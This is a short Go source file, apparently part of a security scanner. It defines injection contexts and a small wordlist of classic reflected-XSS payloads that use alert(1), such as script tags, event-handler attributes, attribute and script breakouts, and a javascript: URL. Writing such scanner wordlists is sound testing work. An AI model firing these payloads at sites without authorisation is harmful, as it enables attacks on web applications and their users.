package xss

type Context string

const (
	ContextHTML      Context = "html"      // breaks out into raw HTML (a new tag)
	ContextAttribute Context = "attribute" // breaks out of an HTML attribute value
	ContextJS        Context = "js"        // breaks out of an inline <script> string literal
	ContextURL       Context = "url"       // used as a URL/href value (javascript: scheme)
)

type Payload struct {
	Value   string  `json:"value"`
	Context Context `json:"context"`
}

// Payloads is a small, well-known reflected-XSS wordlist covering the
// contexts an injected value commonly lands in. Kept intentionally short —
// this is a quick signal check (does the payload survive unescaped?), not an
// exhaustive fuzzer or a DOM-XSS/headless-browser scanner.
var Payloads = []Payload{
	{`<script>alert(1)</script>`, ContextHTML},
	{`<img src=x onerror=alert(1)>`, ContextHTML},
	{`<svg onload=alert(1)>`, ContextHTML},
	{`<body onload=alert(1)>`, ContextHTML},
	{`<iframe src=javascript:alert(1)>`, ContextHTML},
	{`<details open ontoggle=alert(1)>`, ContextHTML},
	{`"><script>alert(1)</script>`, ContextAttribute},
	{`'><script>alert(1)</script>`, ContextAttribute},
	{`" autofocus onfocus=alert(1) x="`, ContextAttribute},
	{`' autofocus onfocus=alert(1) x='`, ContextAttribute},
	{`javascript:alert(1)`, ContextURL},
	{`';alert(1);//`, ContextJS},
	{`</script><script>alert(1)</script>`, ContextJS},
}
